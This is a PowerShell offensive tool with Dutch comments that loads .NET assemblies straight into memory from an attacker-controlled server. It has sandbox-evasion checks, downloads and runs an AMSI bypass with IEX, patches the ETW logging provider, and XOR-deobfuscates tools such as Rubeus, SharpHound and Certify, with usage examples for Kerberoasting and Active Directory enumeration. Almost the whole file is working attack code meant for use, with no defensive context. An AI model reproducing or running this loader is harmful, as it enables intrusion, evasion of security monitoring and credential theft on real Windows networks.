#Requires -Version 3
<#
.SYNOPSIS
    In-Memory .NET Assembly Loader met XOR-deobfuscatie en sandbox detectie.
    Laadt een .NET assembly direct in geheugen zonder schrijven naar schijf.

.PARAMETER Tool
    Naam van een tool in http/tools/ op de attacker server (bijv. Rubeus.exe)

.PARAMETER Payload
    Naam van een payload in http/payloads/ op de attacker server

.PARAMETER Url
    Directe URL of UNC-pad (\\server\share\tool.exe) naar een .NET assembly

.PARAMETER Arg
    Argumenten die worden doorgegeven aan de geladen assembly

.PARAMETER Lhost
    Attacker IP of hostname (standaard ingevuld via dashboard)

.PARAMETER Port
    Poort van de attacker HTTP server (standaard ingevuld via dashboard)

.PARAMETER XorKey
    Hex-gecodeerde XOR-sleutel voor deobfuscatie (leeg = geen XOR)

.PARAMETER EntryPoint
    Volledige typenaam van de klasse met Main() methode (optioneel override)

.PARAMETER NoAmsi
    Sla de AMSI bypass over (bijv. als al uitgevoerd)

.PARAMETER NoEtw
    Sla de ETW bypass over (bijv. als al uitgevoerd)

.PARAMETER NoSleep
    Sla sandbox-detectie via timing en omgevingschecks over

.EXAMPLE
    .\invoke_assembly.ps1 -Tool Rubeus.exe -Arg kerberoast
    .\invoke_assembly.ps1 -Tool SharpHound.exe -Arg "--CollectionMethods","All"
    .\invoke_assembly.ps1 -Url http://[ip]/tools/Certify.exe -Arg "find","/vulnerable"
    .\invoke_assembly.ps1 -Url \\[ip]\share\tools\Rubeus.exe -Arg kerberoast
    .\invoke_assembly.ps1 -Tool Rubeus.exe -XorKey deadbeef01020304 -Arg kerberoast
#>
param(
    [Parameter(Mandatory=$false)][string]  $Tool       = "",
    [Parameter(Mandatory=$false)][string]  $Payload    = "",
    [Parameter(Mandatory=$false)][string]  $Url        = "",
    [Parameter(Mandatory=$false)][string[]]$Arg        = @(),
    [Parameter(Mandatory=$false)][string]  $Lhost      = "[ip]",
    [Parameter(Mandatory=$false)][int]     $Port       = [port],
    [Parameter(Mandatory=$false)][string]  $XorKey     = "[xor_key]",
    [Parameter(Mandatory=$false)][string]  $EntryPoint = "",
    [Parameter(Mandatory=$false)][switch]  $NoAmsi,
    [Parameter(Mandatory=$false)][switch]  $NoEtw,
    [Parameter(Mandatory=$false)][switch]  $NoSleep
)

$base = "http://${Lhost}:${Port}"

# ── Sandbox detectie via timing en omgevingschecks ──────────────────
if (-not $NoSleep) {
    try {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        [Threading.Thread]::Sleep(1500)
        $sw.Stop()
        # Sandbox versnelt vaak systeemtijd: gemeten elapsed < werkelijke
        if ($sw.ElapsedMilliseconds -lt 800) { exit 0 }
    } catch { }
    try {
        # Sandbox VMs hebben typisch weinig RAM en processen
        $ram = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory
        if ($null -ne $ram -and $ram -lt 2GB) { exit 0 }
        $procs = (Get-Process -ErrorAction SilentlyContinue).Count
        if ($procs -lt 15) { exit 0 }
    } catch { }
}

# ── AMSI bypass laden van attacker server ────────────────────────────
if (-not $NoAmsi) {
    try {
        $wc0 = New-Object Net.WebClient
        $wc0.Proxy = [Net.WebRequest]::DefaultWebProxy
        $wc0.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $wc0.DownloadString("$base/payloads/amsi-bypass.ps1") | IEX
    } catch { }
}

# ── ETW bypass (patch etwProvider m_enabled) ─────────────────────────
if (-not $NoEtw) {
    try {
        $t = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        $f = $t.GetField('etwProvider', 'NonPublic,Static')
        $p = $f.GetValue($null)
        [Void]$p.GetType().GetField('m_enabled', 'NonPublic,Instance').SetValue($p, [Byte]0)
    } catch { }
}

# ── Bepaal download-URL ───────────────────────────────────────────────
if ($Url) {
    $dlTarget = $Url
} elseif ($Tool -or $Payload) {
    $src  = if ($Tool) { 'tools' } else { 'payloads' }
    $name = if ($Tool) { $Tool  } else { $Payload }
    if ($XorKey -ne '') {
        # Download via XOR endpoint op attacker server
        $dlTarget = "$base/api/invoke-assembly/xor/$src/${name}?key=$XorKey"
    } else {
        $dlTarget = "$base/$src/$name"
    }
} else {
    Write-Host "[-] Geef -Tool, -Payload of -Url op"
    Write-Host "    Voorbeeld: .\invoke_assembly.ps1 -Tool Rubeus.exe -Arg kerberoast"
    exit 1
}

# ── Download assembly: WebClient (proxy-aware) met fallback naar IWR ──
$rawBytes = $null
try {
    if ($dlTarget.StartsWith('\\')) {
        $rawBytes = [IO.File]::ReadAllBytes($dlTarget)
    } else {
        $wc = New-Object Net.WebClient
        $wc.Proxy = [Net.WebRequest]::DefaultWebProxy
        $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        $rawBytes = $wc.DownloadData($dlTarget)
    }
} catch {
    try {
        if ($dlTarget.StartsWith('\\')) {
            $rawBytes = [IO.File]::ReadAllBytes($dlTarget)
        } else {
            $rawBytes = (Invoke-WebRequest -Uri $dlTarget -UseBasicParsing -TimeoutSec 30).Content
        }
    } catch {
        Write-Host "[-] Download mislukt: $_"
        exit 1
    }
}

# ── XOR deobfuscatie (indien sleutel aanwezig) ───────────────────────
if ($XorKey -ne '' -and $null -ne $rawBytes) {
    $keyBytes = [byte[]]([regex]::Matches($XorKey, '..') |
                ForEach-Object { [Convert]::ToInt32($_.Value, 16) })
    $bytes = New-Object byte[] $rawBytes.Length
    for ($i = 0; $i -lt $rawBytes.Length; $i++) {
        $bytes[$i] = $rawBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
} else {
    $bytes = $rawBytes
}

# ── Laad en voer uit in geheugen ─────────────────────────────────────
try {
    $asm = [Reflection.Assembly]::Load($bytes)
    if ($EntryPoint) {
        $ep = $asm.GetType($EntryPoint).GetMethod(
            'Main', [Reflection.BindingFlags]'Public,NonPublic,Static')
    } else {
        $ep = $asm.EntryPoint
    }
    if ($null -eq $ep) { Write-Host "[-] EntryPoint niet gevonden"; exit 1 }
    if ($Arg.Count -gt 0) {
        $ep.Invoke($null, @(,[string[]]$Arg))
    } else {
        $ep.Invoke($null, $null)
    }
} catch {
    Write-Host "[-] Fout bij laden of uitvoeren: $_"
}
